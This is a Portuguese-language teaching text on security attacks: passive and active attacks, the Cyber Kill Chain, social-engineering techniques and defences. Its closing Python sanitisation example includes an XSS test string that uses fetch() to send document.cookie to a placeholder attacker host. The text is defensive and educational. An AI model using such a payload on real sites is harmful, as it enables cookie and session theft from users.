# **Ataques à Segurança da Informação**

Um **ataque** é definido como qualquer ação que comprometa a segurança das informações de uma organização. Eles ocorrem quando uma fonte de ameaça explora uma vulnerabilidade para causar impacto a um ativo (dados, sistemas ou pessoas).

Os ataques são classificados em duas grandes categorias, dependendo da forma como interagem com o sistema e a informação:

---

## **1. Ataques Passivos**

Os ataques passivos têm como objetivo a **interceptação** e a leitura de informações. O atacante não altera os dados nem interfere no funcionamento do sistema; o foco é a quebra da **confidencialidade**. Por serem furtivos, são extremamente difíceis de detetar, pois não deixam rastros óbvios.

### **Tipos de Ataques Passivos**

* **Sniffing (Interceptação de Tráfego):** O atacante utiliza um software ou hardware (*sniffer*) para monitorizar e capturar pacotes de dados que viajam pela rede. Se os dados não estiverem cifrados, o atacante pode ler logins, senhas e mensagens.
* **Spyware (Monitorização Furtiva):** Software malicioso instalado sem o conhecimento do utilizador para recolher dados.
* **Keylogger:** Regista todas as teclas premidas no teclado.
* **Screenlogger:** Captura imagens da tela do computador periodicamente.


* **Ataque de Ombro (Shoulder Surfing):** Observação direta de um utilizador enquanto este insere credenciais ou informações confidenciais em locais públicos.
* **Dumpster Diving (Mergulho no Lixo):** Recuperação de informações sensíveis através de documentos ou mídias físicas descartadas incorretamente no lixo.

### **Como se defender**

* **Criptografia:** Utilizar protocolos cifrados (como HTTPS, TLS, VPN) para que os dados capturados sejam ilegíveis.
* **Antimalware:** Manter ferramentas de proteção atualizadas para identificar e remover programas espiões.
* **Políticas de Descarte Seguro:** Utilizar fragmentadoras de papel e destruição física de dispositivos de armazenamento antigos.

---

## **2. Ataques Ativos**

Os ataques ativos envolvem a **modificação** de fluxos de dados ou a criação de informações falsas. Eles visam comprometer a **integridade**, a **disponibilidade** e a **autenticidade** dos sistemas.

### **Tipos de Ataques Ativos**

#### **A. Injeção e Manipulação de Dados**

* **Injection (Injeção de Código):** Ocorre quando um atacante envia dados não confiáveis para um interpretador como parte de um comando ou consulta. A aplicação falha ao não validar a entrada, permitindo que o atacante "force" o sistema a executar instruções maliciosas.
* **SQL Injection (SQLi):** Inserção de comandos SQL em formulários para manipular ou extrair dados da base de dados.
* **Cross-Site Scripting (XSS):** Injeção de scripts (Javascript) em páginas web que são executados no navegador da vítima para roubar sessões.
* **Command Injection:** Injeção de comandos do sistema operativo através de campos de entrada da aplicação.


* **Buffer Overflow (Estouro de Buffer):** Envio de um volume de dados maior do que a memória (buffer) de uma aplicação consegue suportar. O excesso transborda para áreas adjacentes, permitindo ao atacante injetar e executar código malicioso ou causar o bloqueio do sistema.

#### **B. Falsificação (Spoofing) e Armadilhas**

* **Spoofing (Falsificação):**
* **IP Spoofing:** O atacante mascara o endereço IP de origem para parecer que o tráfego vem de uma fonte confiável.
* **E-mail Spoofing:** Alteração do cabeçalho de um e-mail para que o remetente pareça ser alguém conhecido.
* **DNS Spoofing:** Envenenamento do cache do DNS para redirecionar utilizadores de sites legítimos para sites falsos.


* **Phishing:** Envio de mensagens (e-mail, SMS) que simulam entidades reais para enganar o utilizador e obter senhas ou dados bancários.
* **Cross-Site Request Forgery (CSRF):** Ataque cibernético que engana o navegador de um usuário autenticado para realizar ações indesejadas em outro site, como alterar senhas ou transferir fundos. O invasor aproveita a sessão activa do usuário, tornando a ação fraudulenta legítima para o servidor.

#### **C. Negação de Serviço e Extorsão**

* **DoS e DDoS (Negação de Serviço):** Sobrecarga de um servidor com tráfego massivo para torná-lo indisponível. No **DDoS**, o ataque é feito de forma distribuída por milhares de máquinas infectadas (**Botnets**).
* **Ransomware:** Malware que cifra (bloqueia) os arquivos do utilizador e exige o pagamento de um resgate (geralmente em criptomoedas) para a devolução do acesso.

### **Como se defender**

* **Validação de Entradas:** Implementar filtros rigorosos e consultas parametrizadas (*Prepared Statements*) para evitar injeções.
* **Firewalls e IPS:** Configurar sistemas de prevenção de intrusão que detetem padrões de ataques conhecidos e bloqueiem tráfego de *spoofing*.
* **Autenticação Multifator (MFA):** Garante que, mesmo que o atacante tenha a senha (via Phishing), não consiga aceder à conta.
* **Gestão de Patches:** Manter softwares e sistemas operativos atualizados para fechar brechas de segurança.

---

## **3. As Fases de um Ataque Estruturado**

Invasões e ataques cibernéticos complexos raramente acontecem por acaso ou em um único clique. No cenário profissional da segurança da informação, os invasores seguem uma metodologia sequencial para atingir seus alvos. O modelo mais conhecido para entender esses passos é a **Cyber Kill Chain**:

1. **Reconhecimento (Reconnaissance):** É a fase de planejamento e coleta de dados. O atacante estuda o alvo usando ferramentas automatizadas para descobrir endereços IP, portas abertas, sistemas operacionais e até redes sociais de funcionários para planejar uma Engenharia Social.
2. **Preparação (Weaponization):** O invasor combina uma ferramenta maliciosa (como um *ransomware* ou script de injeção) com uma forma de entrega (um arquivo PDF falso, um link ou um formulário vulnerável).
3. **Entrega (Delivery):** A armadilha é enviada para o alvo. Pode ocorrer de forma passiva (esperando alguém acessar um site infectado) ou ativa (enviando um e-mail de *phishing* direcionado).
4. **Exploração (Exploitation):** O código malicioso entra em ação. Ele explora a vulnerabilidade encontrada na fase de reconhecimento (pode ser um sistema desatualizado ou o clique de um usuário enganado).
5. **Instalação (Installation):** O atacante instala um programa espião ou um vírus persistente (*backdoor*) no equipamento da vítima. Isso garante que ele continue tendo acesso à máquina mesmo se o computador for reiniciado.
6. **Comando e Controle (C2 - Command and Control):** O computador invadido abre um canal de comunicação secreto com o servidor externo do hacker. A partir desse momento, o invasor consegue controlar a máquina remotamente e enviar ordens à distância.
7. **Ações nos Objetivos (Actions on Objectives):** É a fase final, onde o estrago é feito. Com o controle total do sistema, o atacante realiza seu objetivo principal: roubar dados confidenciais, apagar arquivos, alterar tabelas financeiras ou criptografar os dados para exigir resgate.

---

# **O Fator Humano: Engenharia Social**

A **Engenharia Social** é a arte de manipular pessoas para que elas divulguem informações confidenciais ou realizem ações que comprometam a segurança. Em vez de usar força bruta contra um firewall, o atacante usa a psicologia contra o utilizador.

---

## **1. Principais Técnicas de Engenharia Social**

Os ataques variam desde disparos em massa até operações altamente personalizadas para alvos de alto valor.

### **A. Variantes de Phishing (Focadas em Comunicação)**

* **Phishing Comum:** Disparo em massa de e-mails ou mensagens genéricas para "pescar" qualquer vítima incauta.
* **Spear Phishing:** Ataque direcionado a um indivíduo ou departamento específico. O atacante pesquisa sobre a vítima (nome, cargo, projetos) para tornar a mensagem extremamente convincente.
* **Whaling (Caça à Baleia):** Um tipo de spear phishing que foca exclusivamente no **topo da pirâmide organizacional** (CEOs, CFOs, Diretores). O objetivo é roubar segredos corporativos de alto nível ou autorizar transferências financeiras massivas.
* **Vishing (Voice Phishing):** Engenharia social via chamadas telefônicas, onde o atacante usa urgência ou autoridade para obter dados.
* **Smishing (SMS Phishing):** Ataques realizados através de mensagens de texto com links maliciosos.

### **B. Técnicas de Proximidade e Interação**

* **Pretexting:** O atacante cria um cenário (pretexto) elaborado. Exemplo: Fingir ser um auditor de TI que precisa de acesso temporário para "corrigir uma falha crítica no perfil do usuário".
* **Baiting (Isca):** Oferecer algo atraente para a vítima. Exemplo: Deixar um pendrive com uma etiqueta "Bônus Salarial 2026" no estacionamento da empresa. Ao conectar o dispositivo, um malware é instalado.
* **Quid Pro Quo (Algo por Algo):** O atacante oferece um serviço em troca de informações. Exemplo: "Eu sou do suporte técnico, estou a ligar para resolver um problema de lentidão, só preciso que me dê a sua senha para rodar o diagnóstico".
* **Tailgating (Carona):** Uma técnica física onde o atacante segue um funcionário autorizado para entrar em uma área restrita antes que a porta se feche.

---

## **2. Os Gatilhos Psicológicos Utilizados**

Os engenheiros sociais exploram tendências comportamentais humanas básicas:

1. **Autoridade:** As pessoas tendem a obedecer a pedidos de quem parece ser um superior ou autoridade legal.
2. **Urgência:** Criar um senso de "faça agora ou sua conta será bloqueada" impede o pensamento crítico.
3. **Escassez:** Oferecer algo exclusivo que está prestes a acabar.
4. **Afeição/Confiança:** Atacantes costumam ser amigáveis e carismáticos para baixar a guarda da vítima.

---

## **3. Defesa: A Camada 8 da Segurança**

Como o alvo é humano, a solução técnica (firewalls/antivírus) é apenas parte da resposta. A verdadeira defesa está na cultura organizacional:

* **Programas de Conscientização:** Simulações periódicas de phishing para treinar o "olho clínico" dos colaboradores.
* **Cultura de Verificação:** Instituir que pedidos de dados sensíveis ou transferências devem ser confirmados por um segundo canal (ex: se recebeu e-mail, ligue para confirmar).
* **Políticas de "Mesa Limpa":** Evitar senhas anotadas em post-its ou documentos sensíveis expostos.
* **Princípio do Menor Privilégio:** Garantir que, mesmo que um usuário caia em um golpe, ele não tenha permissão para comprometer todo o sistema.

---

## **4. O Cenário em 2026: Ataques Automatizados e Deepfakes por IA**

* **Ataques de Phishing Gerados por IA:** Em 2026, os ataques de engenharia social deixaram de apresentar erros óbvios de ortografia ou traduções malfeitas. Invasores utilizam Inteligência Artificial generativa para criar e-mails e pretextos hiperpersonalizados em tempo real de forma massiva, analisando perfis públicos de milhares de funcionários simultaneamente.
* **Deepfakes de Voz e Vídeo no Vishing:** O tradicional golpe por telefone evoluiu drasticamente. Com o uso de ferramentas de clonagem de voz por IA, atacantes realizam chamadas de *Vishing* imitando perfeitamente o tom de voz e a forma de falar de diretores ou CEOs da empresa para ordenar transferências ou liberação de credenciais críticas, tornando o gatilho da autoridade extremamente perigoso.

---

## **5. Implementação Prática (Simulações Técnicas)**

Na rotina de defesa e testes de invasão (*Pentest*), analistas utilizam códigos simples para validar a segurança das entradas de sistemas web e coletar metadados de inteligência.

### **Exemplo em Python (Validação Básica contra Injeção de Scripts - XSS)**

Abaixo está uma rotina simples usada em formulários para higienizar dados de entrada e bloquear scripts maliciosos injetados por usuários antes de renderizá-los na tela:

```python
import html

def sanitizar_entrada_usuario(texto_campo):
    # Converte caracteres especiais (como < e >) em entidades HTML seguras
    # Impede que tags <script> inseridas por atacantes sejam executadas no navegador
    texto_limpo = html.escape(texto_campo)
    return texto_limpo

if __name__ == "__main__":
    # Simulação de uma tentativa ativa de ataque Cross-Site Scripting (XSS)
    entrada_perigosa = "<script>fetch('http://site-hacker.com/roubar?cookie=' + document.cookie)</script>"
    
    print("--- Entrada Injetada Origem ---")
    print(entrada_perigosa)
    
    print("\n--- Saída Higienizada (Segura para Armazenamento e Exibição) ---")
    saida_segura = sanitizar_entrada_usuario(entrada_perigosa)
    print(saida_segura)

```